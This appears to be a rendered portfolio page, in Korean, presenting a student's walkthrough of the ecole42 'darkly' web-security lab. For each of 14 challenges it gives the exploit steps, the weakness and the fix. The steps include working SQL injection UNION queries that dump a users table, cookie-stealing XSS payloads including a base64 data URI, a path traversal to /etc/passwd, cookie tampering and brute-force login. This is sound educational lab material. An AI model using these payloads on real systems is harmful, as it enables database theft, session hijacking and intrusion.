@@ -1,0 +1,538 @@
+1:"$Sreact.fragment"
+2:I[26334,["1921","static/chunks/79812939-dd468ad34b0555ab.js","9991","static/chunks/9991-ccaf069d2d1a3394.js","650","static/chunks/650-f48a6caa28b58c59.js","7285","static/chunks/7285-e0b078d0c178a272.js","8634","static/chunks/8634-41f00eb732804d51.js","2061","static/chunks/2061-28fac52e9cc6c1cf.js","1283","static/chunks/1283-41499aa8a4a2d40d.js","5441","static/chunks/5441-6139f8dec0b22e57.js","4848","static/chunks/app/%5Blocale%5D/projects/schools/%5Bid%5D/page-1700be87c12c054d.js"],"BlurFade"]
+3:I[935,["1921","static/chunks/79812939-dd468ad34b0555ab.js","9991","static/chunks/9991-ccaf069d2d1a3394.js","650","static/chunks/650-f48a6caa28b58c59.js","7285","static/chunks/7285-e0b078d0c178a272.js","8634","static/chunks/8634-41f00eb732804d51.js","2061","static/chunks/2061-28fac52e9cc6c1cf.js","1283","static/chunks/1283-41499aa8a4a2d40d.js","5441","static/chunks/5441-6139f8dec0b22e57.js","4848","static/chunks/app/%5Blocale%5D/projects/schools/%5Bid%5D/page-1700be87c12c054d.js"],"default"]
+a:I[68708,["1921","static/chunks/79812939-dd468ad34b0555ab.js","9991","static/chunks/9991-ccaf069d2d1a3394.js","650","static/chunks/650-f48a6caa28b58c59.js","7285","static/chunks/7285-e0b078d0c178a272.js","8634","static/chunks/8634-41f00eb732804d51.js","2061","static/chunks/2061-28fac52e9cc6c1cf.js","1283","static/chunks/1283-41499aa8a4a2d40d.js","5441","static/chunks/5441-6139f8dec0b22e57.js","4848","static/chunks/app/%5Blocale%5D/projects/schools/%5Bid%5D/page-1700be87c12c054d.js"],"MarkdownContent",1]
+c:I[64725,[],"OutletBoundary"]
+d:"$Sreact.suspense"
+:HL["/_next/static/css/911e6a603adbdfb3.css","style"]
+0:{"buildId":"7wrLch1PHmN9S3I0q82uc","rsc":["$","$1","c",{"children":[["$","section",null,{"id":"project","className":"mx-auto max-w-4xl px-6 pt-20 pb-40","children":["$","$L2",null,{"delay":0.04,"duration":0.5,"blur":"4px","children":[["$","nav",null,{"aria-label":"breadcrumb","data-slot":"breadcrumb","className":"mb-6","children":["$","ol",null,{"data-slot":"breadcrumb-list","className":"text-muted-foreground flex flex-wrap items-center gap-1.5 text-sm break-words sm:gap-2.5","children":[["$","li","item-0",{"data-slot":"breadcrumb-item","className":"inline-flex items-center gap-1.5","children":["$","$L3",null,{"ref":null,"href":"/ko/resume","localeCookie":{"name":"NEXT_LOCALE","sameSite":"lax"},"children":"Resume","data-slot":"breadcrumb-link","className":"hover:text-foreground transition-colors"}]}],["$","li","separator-1",{"data-slot":"breadcrumb-separator","role":"presentation","aria-hidden":"true","className":"[&>svg]:size-3.5","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":24,"height":24,"viewBox":"0 0 24 24","fill":"none","stroke":"currentColor","strokeWidth":2,"strokeLinecap":"round","strokeLinejoin":"round","className":"lucide lucide-chevron-right","aria-hidden":"true","children":[["$","path","mthhwq",{"d":"m9 18 6-6-6-6"}],"$undefined"]}]}],["$","li","item-1",{"data-slot":"breadcrumb-item","className":"inline-flex items-center gap-1.5","children":["$","$L3",null,{"ref":null,"href":"/ko/projects/schools","localeCookie":{"name":"NEXT_LOCALE","sameSite":"lax"},"children":"Academic Projects","data-slot":"breadcrumb-link","className":"hover:text-foreground transition-colors"}]}],["$","li","separator-2",{"data-slot":"breadcrumb-separator","role":"presentation","aria-hidden":"true","className":"[&>svg]:size-3.5","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":24,"height":24,"viewBox":"0 0 24 24","fill":"none","stroke":"currentColor","strokeWidth":2,"strokeLinecap":"round","strokeLinejoin":"round","className":"lucide lucide-chevron-right","aria-hidden":"true","children":[["$","path","mthhwq",{"d":"m9 18 6-6-6-6"}],"$undefined"]}]}],["$","li","item-2",{"data-slot":"breadcrumb-item","className":"inline-flex items-center gap-1.5","children":["$","span",null,{"data-slot":"breadcrumb-page","role":"link","aria-disabled":"true","aria-current":"page","className":"text-foreground font-normal","children":"darkly"}]}]]}]}],["$","script",null,{"type":"application/ld+json","suppressHydrationWarning":true,"dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@type\":\"Project\",\"name\":\"darkly\",\"description\":\"darkly는 ecole42의 웹 보안 프로젝트로, 14개의 웹 보안 취약점 챌린지를 통해 웹사이트의 취약점을 발견하고 수정하는 방법을 학습한다. SQL Injection, XSS, Path Traversal, Brute Force 등 다양한 웹 보안 취약점을 실습하며, OWASP 가이드라인을 기반으로 웹 애플리케이션 보안 테스팅 기법을 익힌다. 이를 통해 웹 보안의 중요성과 프레임워크가 제공하는 보안 기능의 필요성을 이해한다\",\"image\":\"https://woolimi.github.io/og?title=darkly\",\"url\":\"https://woolimi.github.io/projects/schools/darkly\",\"author\":{\"@type\":\"Person\",\"name\":\"박우림\"}}"}}],["$","div",null,{"className":"space-y-4","children":[["$","div",null,{"className":"focus:ring-ring rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:ring-2 focus:ring-offset-2 focus:outline-none text-foreground mb-2 inline-flex w-fit items-center gap-1.5","children":[["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":24,"height":24,"viewBox":"0 0 24 24","fill":"none","stroke":"currentColor","strokeWidth":2,"strokeLinecap":"round","strokeLinejoin":"round","className":"lucide lucide-graduation-cap size-3.5","aria-hidden":"true","children":[["$","path","j76jl0",{"d":"M21.42 10.922a1 1 0 0 0-.019-1.838L12.83 5.18a2 2 0 0 0-1.66 0L2.6 9.08a1 1 0 0 0 0 1.832l8.57 3.908a2 2 0 0 0 1.66 0z"}],["$","path","1lu8f3",{"d":"M22 10v6"}],["$","path","1r8lef",{"d":"M6 12.5V16a6 3 0 0 0 12 0v-3.5"}],"$undefined"]}],["$","span",null,{"children":"ecole42"}]]}],false,["$","h1",null,{"className":"text-3xl leading-tight font-semibold tracking-tight sm:text-4xl sm:leading-tight md:text-5xl md:leading-tight lg:text-6xl lg:leading-tight","children":"darkly"}],"$undefined",["$","p",null,{"className":"text-base leading-relaxed","children":"darkly는 ecole42의 웹 보안 프로젝트로, 14개의 웹 보안 취약점 챌린지를 통해 웹사이트의 취약점을 발견하고 수정하는 방법을 학습한다. SQL Injection, XSS, Path Traversal, Brute Force 등 다양한 웹 보안 취약점을 실습하며, OWASP 가이드라인을 기반으로 웹 애플리케이션 보안 테스팅 기법을 익힌다. 이를 통해 웹 보안의 중요성과 프레임워크가 제공하는 보안 기능의 필요성을 이해한다"}],"$L4","$L5"]}],"$L6"]}]}],["$L7"],"$L8"]}],"loading":null,"isPartial":false}
+4:["$","div",null,{"className":"flex flex-wrap gap-2","children":[["$","div","0",{"className":"focus:ring-ring inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:ring-2 focus:ring-offset-2 focus:outline-none bg-secondary text-secondary-foreground hover:bg-secondary/80 border-transparent","children":"Web Security"}]]}]
+9:T518,M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z5:["$","div",null,{"className":"flex flex-wrap items-center gap-2","children":["$undefined",["$","a",null,{"href":"https://github.com/woolimi/darkly","target":"_blank","rel":"noopener noreferrer","className":"inline-flex items-center gap-1.5 rounded-md bg-black px-3 py-1.5 text-sm font-medium text-white transition-colors hover:bg-gray-800 ","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 496 512","className":"size-4","children":["$undefined",[["$","path","0",{"d":"$9","children":[]}]]],"style":{},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],"GitHub"]}]]}]
+b:T436f,
+# Darkly
+
+## 개요
+
+웹사이트를 개발할 때, 우리는 World Wide Web에서 노출되는 위험에 대해 잘 알지 못한다. `Darkly`는 ecole42의 웹 분야 프로젝트 중 하나로, 웹사이트가 얼마나 취약한지, 그리고 프레임워크가 우리를 위해 얼마나 많은 일을 하고 있는지 알려준다.
+
+프로젝트를 시작하기 전에 [OWASP - 웹 보안 테스팅 가이드](https://owasp.org/www-project-web-security-testing-guide/stable/)를 읽어보는 것을 강력히 권장한다.
+
+## Darkly_i386.iso VM 실행 (Ubuntu 18.04)
+
+```bash
+sudo apt-get install qemu
+sudo apt-get install virt-manager
+sudo virt-manager
+```
+
+## 프로젝트 구조
+
+이 프로젝트는 총 14개의 웹 보안 취약점 챌린지로 구성되어 있다. 각 챌린지는 특정 웹 보안 취약점을 다루며, 플래그를 획득하는 것이 목표다.
+
+---
+
+## 챌린지 목록
+
+### 01. robots.txt_1
+
+**경로**: `/whatever`
+
+**설명**:
+robots.txt 파일은 웹 크롤러가 접근할 수 있는 경로를 지정하는 파일이다. 이 챌린지에서는 robots.txt에 명시된 `/whatever` 경로를 탐색하여 관리자 페이지 접근 정보를 찾아야 한다.
+
+**플래그 획득 방법**:
+
+1. `/whatever` 경로에서 htpasswd 파일 확인
+2. 해시 값 `8621ffdbc5698829397d97767ac13db3`를 [hashtoolkit.com](https://hashtoolkit.com/)에서 복호화 → `dragon`
+3. dirb를 사용하여 웹 콘텐츠 URL 탐색
+   ```bash
+   sudo apt install dirb
+   dirb http://server_ip
+   ```
+4. 관리자 페이지(`http://server_ip/admin/`) 접근
+   - ID: `root`
+   - Password: `dragon`
+
+**취약점**:
+민감한 정보가 노출됨
+
+**해결 방법**:
+
+- robots.txt에서 `Disallow` 대신 nginx 서버에서 noindex 설정
+- 민감한 폴더와 파일에 적절한 권한 설정
+
+**리소스**:
+
+- [OWASP - Review Webserver Metafiles for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.html)
+
+---
+
+### 02. robots.txt_2
+
+**경로**: `/.hidden`
+
+**설명**:
+robots.txt에 명시된 `/.hidden` 디렉토리를 탐색하여 플래그를 찾아야 합니다.
+
+**플래그 획득 방법**:
+
+```bash
+sh getflag.sh [server_ip]
+```
+
+스크립트는 `.hidden` 디렉토리를 재귀적으로 다운로드하고 플래그를 검색한다.
+
+**취약점**:
+민감한 정보가 노출됨
+
+**해결 방법**:
+
+- robots.txt에서 `Disallow` 대신 nginx 서버에서 noindex 설정
+- 민감한 폴더와 파일에 적절한 권한 설정
+
+**리소스**:
+
+- [OWASP - Review Webserver Metafiles for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.html)
+
+---
+
+### 03. Cookies
+
+**경로**: 메인 페이지
+
+**설명**:
+HTTP는 상태를 유지하지 않는 프로토콜이므로, 세션 관리를 위해 쿠키를 사용한다. 이 챌린지에서는 쿠키 값을 조작하여 관리자 권한을 획득해야 한다.
+
+**플래그 획득 방법**:
+
+1. 개발자 도구의 Application 탭에서 쿠키 확인
+2. `I_am_admin` 쿠키 값을 변경:
+   - 변경 전: `68934a3e9455fa72420237eb05902327`
+   - 변경 후: `b326b5062b2f0e69046810717534cb09`
+   - (해시 값은 [hashtoolkit.com](https://hashtoolkit.com/)에서 확인 가능)
+3. 변경 후 알림 메시지에서 플래그 확인
+
+**취약점**:
+쿠키 값을 변경하여 누구나 관리자가 될 수 있음
+
+**해결 방법**:
+
+- 중요한 데이터를 쿠키에 저장하지 않기
+- 데이터베이스에 저장
+- 세션 관리의 경우 암호학적으로 강력한 세션 ID 생성
+
+**리소스**:
+
+- [OWASP - Testing for Cookies Attributes](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html)
+- [OWASP - Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+
+---
+
+### 04. Hidden Form
+
+**경로**: `/?page=recover`
+
+**설명**:
+숨겨진 입력 필드의 값을 조작하여 플래그를 획득해야 한다.
+
+**플래그 획득 방법**:
+
+1. 페이지 소스에서 숨겨진 입력 필드 확인:
+   ```html
+   <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15" />
+   ```
+2. 값을 변경하고 제출 버튼 클릭
+
+**취약점**:
+화면에 보이지 않더라도 숨겨진 입력 필드는 조작 가능함. 이 경우 수신자 이메일 주소를 변경할 수 있음
+
+**해결 방법**:
+
+1. 민감한 정보가 포함된 숨겨진 입력 필드 값 대신 백엔드에서 처리
+2. 숨겨진 폼(실제로는 모든 프론트엔드 코드)이 조작될 수 있음을 인지
+
+---
+
+### 05. Member SQL Injection
+
+**경로**: `/index.php?page=member`
+
+**설명**:
+회원 ID에 따라 회원 정보를 표시하는 페이지에서 SQL 인젝션 공격을 통해 데이터베이스 정보를 추출해야 한다.
+
+**플래그 획득 방법**:
+
+1. **MySQL 지문 인식**:
+   - 작은따옴표(`'`) 입력하여 에러 메시지 확인
+   - 또는 `1 /*! and 1=0 */` 입력 (MySQL만 해석)
+
+2. **버전 확인**:
+
+   ```
+   1 AND 1=0 UNION SELECT 1, version()
+   ```
+
+   - 결과: 5.5.44
+
+3. **데이터베이스, 스키마, 테이블 목록 확인**:
+
+   ```
+   1 AND 1=0 UNION SELECT 1, DATABASE()
+   1 AND 1=0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=DATABASE()
+   1 AND 1=0 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=DATABASE()
+   ```
+
+   - 결과:
+     - DB/Schema: `Member_Sql_Injection`
+     - 테이블: `users`
+     - 컬럼: `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`
+
+4. **플래그 찾기**:
+
+   ```
+   1 AND 1=0 UNION SELECT 1, concat(Commentaire, countersign) FROM users
+   ```
+
+   - 결과: `5ff9d0165b4f92b14994e5c685cdce28`
+   - [hashtoolkit.com](https://hashtoolkit.com/)에서 복호화 → `FortyTwo`
+   - 소문자 변환: `fortytwo`
+   - SHA256 해시: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
+
+**취약점**:
+공격자가 데이터베이스의 모든 데이터를 가져올 수 있음
+
+**해결 방법**:
+
+1. 데이터베이스 지문 인식: 에러 메시지 표시하지 않기
+2. 사용자 제공 데이터로 쿼리 구성하지 않기. PHP의 경우 PDO 사용
+3. API 사용
+
+**리소스**:
+
+- [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html)
+- [Testing for MySQL](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.html)
+
+---
+
+### 06. Images SQL Injection
+
+**경로**: `/index.php?page=searchimg`
+
+**설명**:
+이미지 ID에 따라 이미지 정보를 표시하는 페이지에서 SQL 인젝션 공격을 통해 플래그를 획득해야 한다.
+
+**플래그 획득 방법**:
+
+1. **데이터베이스 지문 인식**:
+   - 작은따옴표(`'`) 입력하여 사용 중인 DB 서버 확인
+
+2. **데이터베이스, 테이블 확인**:
+
+   ```
+   1 AND 1=0 UNION SELECT 1, DATABASE()
+   1 AND 1=0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=DATABASE()
+   1 AND 1=0 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=DATABASE()
+   ```
+
+   - 결과:
+     - DB: `Member_images`
+     - 테이블: `list_images`
+     - 컬럼: `id`, `url`, `title`, `comment`
+
+3. **플래그 찾기**:
+
+   ```
+   1 AND 1=0 UNION SELECT 1, concat(url, title, comment) FROM list_images
+   ```
+
+   - 결과: `1928e8083cf461a51303633093573c46`
+   - [hashtoolkit.com](https://hashtoolkit.com/)에서 복호화 → `albatroz`
+   - 소문자 변환: `albatroz`
+   - SHA256 해시: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
+
+**취약점**:
+공격자가 데이터베이스의 모든 데이터를 가져올 수 있음
+
+**해결 방법**:
+
+1. 데이터베이스 지문 인식: 에러 메시지 표시하지 않기
+2. 사용자 제공 데이터로 쿼리 구성하지 않기. PHP의 경우 PDO 사용
+
+**리소스**:
+
+- [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html)
+- [Testing for MySQL](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.html)
+
+---
+
+### 07. Feedback XSS
+
+**경로**: `/index.php?page=feedback`
+
+**설명**:
+피드백 페이지에서 저장된 XSS(Cross-Site Scripting) 공격을 수행해야 한다. 서버는 `<script>` 태그를 제외한 HTML 태그를 체크하지 않는다.
+
+**플래그 획득 방법**:
+이름 입력 필드에 다음 값을 입력:
+
+```
+alert
+<img src='aaa' onerror="alert(document.cookie)">
+```
+
+**취약점**:
+저장된 XSS는 가장 위험한 유형의 XSS다. 데이터 저장을 허용하는 웹 애플리케이션은 이 공격에 취약할 수 있다.
+
+이 취약점은 다음과 같은 브라우저 기반 공격에 사용될 수 있습니다:
+
+- 다른 사용자의 브라우저 하이재킹
+- 애플리케이션 사용자가 본 민감한 정보 캡처
+- 애플리케이션의 가짜 디페이스
+- 내부 호스트의 포트 스캔
+- 브라우저 기반 익스플로잇의 직접 전달
+- 기타 악의적인 활동
+
+**해결 방법**:
+항상 사용자 입력을 검증하고 서버 출력을 필터링
+
+**리소스**:
+
+- [Testing for Stored Cross Site Scripting](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html)
+- [URL Encoder](https://www.freeformatter.com/url-encoder.html#ad-output)
+- [HTML Escape](https://www.freeformatter.com/html-escape.html)
+
+---
+
+### 08. Data URI XSS
+
+**경로**: `/?page=media&src=nsa`
+
+**설명**:
+Data URI는 RFC 2397에 정의된 작은 파일을 HTML 문서에 인라인으로 임베드하는 방법이다. 이미지가 object 태그로 렌더링되며, src 파라미터에 따라 데이터가 표시된다.
+
+**플래그 획득 방법**:
+
+1. 스크립트 코드를 base64로 인코딩:
+
+   ```javascript
+   <script>alert(document.cookie)</script>
+   ```
+
+   → `PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+`
+
+2. 다음 URL로 접근:
+   ```
+   /?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ
+   ```
+
+object 태그의 'data' 속성은 객체의 데이터를 참조하는 URL을 정의한다.
+
+**취약점**:
+이 기술은 다양한 MIME 타입의 파일을 동적으로 생성할 수 있게 한다. 공격자는 다양한 오버플로우 취약점을 악용하기 위한 악성 페이로드를 포함한 파일을 생성할 수 있다.
+
+**해결 방법**:
+object 및 embed 태그를 사용하지 않기. XSS에 취약함
+
+**리소스**:
+
+- [Bypass XSS filters using data URIs](https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris)
+- [Base64 Encode-Decode](https://www.motobit.com/util/base64-decoder-encoder.asp)
+
+---
+
+### 09. Upload XSS
+
+**경로**: `/index.php?page=upload`
+
+**설명**:
+파일 업로드 기능에서 파일 확장자만 확인하고 실제 파일 유형을 검증하지 않아 XSS 공격이 가능하다.
+
+**플래그 획득 방법**:
+
+```bash
+sh getflag.sh [server_ip]
+```
+
+스크립트는 `xss.php` 파일을 JPEG MIME 타입으로 업로드한다.
+
+**취약점**:
+다른 XSS 공격과 동일하게 매우 치명적이고 위험함. 공격자가 클라이언트 정보 등을 탈취할 수 있음
+
+**해결 방법**:
+MIME 타입 체크뿐만 아니라 이미지 유효성 검사가 필요함
+
+PHP의 경우:
+
+```php
+exif_imagetype('path/to/image.jpg');
+```
+
+**리소스**:
+
+- [PHP - POST method uploads](https://www.php.net/manual/en/features.file-upload.post-method.php)
+- [What is the best and fastest way to check if the image is valid in PHP?](https://stackoverflow.com/questions/7393419/what-is-the-best-and-fastest-way-to-check-if-the-image-is-valid-in-php)
+
+---
+
+### 10. etc/passwd
+
+**경로**: `/index.php?page=../../../../../../../etc/passwd`
+
+**설명**:
+페이지 파라미터를 통한 경로 탐색(Path Traversal) 공격을 수행하여 서버의 `/etc/passwd` 파일에 접근해야 한다.
+
+**플래그 획득 방법**:
+페이지 변경 시 URL 파라미터 `page`가 변경되는 것을 확인:
+
+```
+http://server_ip/?page=some_page
+```
+
+이 취약점을 악용하여 서버 측 파일, 특히 `/etc/passwd`를 탐색:
+
+```
+/index.php?page=../../../../../../../etc/passwd
+```
+
+**취약점**:
+공격자가 서버의 모든 파일에 접근할 수 있음
+
+**해결 방법**:
+서버 폴더 탐색을 허용하지 않기. 모든 페이지 파일이 특정 폴더 아래에 있도록 설정
+
+---
+
+### 11. Social Link
+
+**경로**: 메인 페이지
+
+**설명**:
+소셜 링크 요소를 검사하고 `site` 파라미터 값을 변경하여 플래그를 획득해야 한다.
+
+**플래그 획득 방법**:
+소셜 링크 요소를 검사하고 `site` 파라미터 값을 변경:
+
+```html
+<a href="index.php?page=redirect&amp;site=whatever" class="icon fa-facebook"></a>
+```
+
+**취약점**:
+공격자가 site 값을 변경하여 동적으로 가짜 링크를 만들 수 있음
+
+**해결 방법**:
+동적 링크 대신 백엔드에서 생성한 정적 링크 사용:
+
+```html
+<a href="https://www.facebook.com/42born2code/" class="icon fa-facebook"></a>
+```
+
+---
+
+### 12. Survey
+
+**경로**: `/index.php?page=survey`
+
+**설명**:
+설문조사 페이지에서 select 태그의 옵션 값을 변경하여 플래그를 획득해야 한다.
+
+**플래그 획득 방법**:
+HTML을 검사하고 select 태그의 옵션 값을 변경
+
+**취약점**:
+로컬에서만 데이터를 검증하면 프록시를 통한 서버 인젝션이나 다른 시스템과의 핸드오프에서 애플리케이션이 취약해질 수 있음
+
+**해결 방법**:
+백엔드에서 검증 체크 수행
+
+**리소스**:
+
+- [Test Business Logic Data Validation](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation.html)
+
+---
+
+### 13. Brute Force
+
+**경로**: `/index.php?page=signin`
+
+**설명**:
+브루트 포스 공격은 암호화 해킹으로, 대상 암호의 가능한 조합을 추측하여 올바른 암호를 발견할 때까지 시도하는 공격이다. 가장 기본적인 브루트 포스 공격은 사전 공격으로, 공격자가 가능한 암호 사전을 통해 모든 암호를 시도한다.
+
+**플래그 획득 방법**:
+
+1. 로그인 시도 시 GET 요청으로 데이터가 전송됨:
+
+   ```
+   /index.php?page=signin&username=any_id&password=any_password&Login=Login#
+   ```
+
+2. 많은 경우 관리자 ID가 `admin`이므로, 이를 사용하여 브루트 포스 공격 실행:
+   ```bash
+   sh getflag.sh [server_ip]
+   ```
+
+스크립트는 `dictionary.txt` 파일의 암호 목록을 사용하여 공격을 수행한다.
+
+**취약점**:
+추측 가능한 ID와 암호는 브루트 포스 공격에 취약함
+
+**해결 방법**:
+
+1. 길고 복잡한 암호 사용
+2. 추측 가능한 관리자 ID 사용하지 않기
+3. 비정상적인 로그인 시도 제한
+4. 로그인에 GET 대신 POST 사용
+
+**리소스**:
+
+- [Brute force attack](https://en.wikipedia.org/wiki/Brute-force_attack)
+- [100 worst password](https://www.forbes.com/sites/daveywinder/2019/12/14/ranked-the-worlds-100-worst-passwords/#413ccca369b4)
+
+---
+
+### 14. NSA
+
+**경로**: `/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c`
+
+**설명**:
+HTTP 요청 헤더를 조작하여 플래그를 획득해야 한다. 페이지 소스의 주석에서 힌트를 찾을 수 있다.
+
+**플래그 획득 방법**:
+페이지를 검사하면 다음 주석을 찾을 수 있다:
+
+```html
+<!--
+You must cumming from : "https://www.nsa.gov/" to go to the next step
+-->
+<!--
+Let's use this browser : "ft_bornToSec". It will help you a lot.
+-->
+```
+
+이 힌트는 Referer를 `"https://www.nsa.gov/"`로 설정하고 User-Agent를 `"ft_bornToSec"`로 설정해야 함을 나타낸다.
+
+```bash
+sh getflag.sh [server_ip]
+```
+
+**취약점**:
+HTTP 요청 헤더는 조작될 수 있다. 서버 측에서 HTTP 요청 헤더와 관련된 중요한 로직이 있는지 확인해야 한다
+
+예를 들어, 특정 페이지 B에서만 특정 페이지 A에 들어갈 수 있도록 허용하는 경우, referrer를 확인하는 것은 좋은 방법이 아니다
+
+**해결 방법**:
+수정할 것은 없음. `referer`와 `user-agent`가 조작될 수 있음을 인지하기만 하면 됨
+
+**리소스**:
+
+- [Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
+- [User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)
+
+---
+
+## 참고자료
+
+- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)
+6:["$","article",null,{"children":["$","$La",null,{"children":"$b"}]}]
+7:["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/911e6a603adbdfb3.css","precedence":"next"}]
+8:["$","$Lc",null,{"children":["$","$d",null,{"name":"Next.MetadataOutlet","children":"$@e"}]}]
+e:null
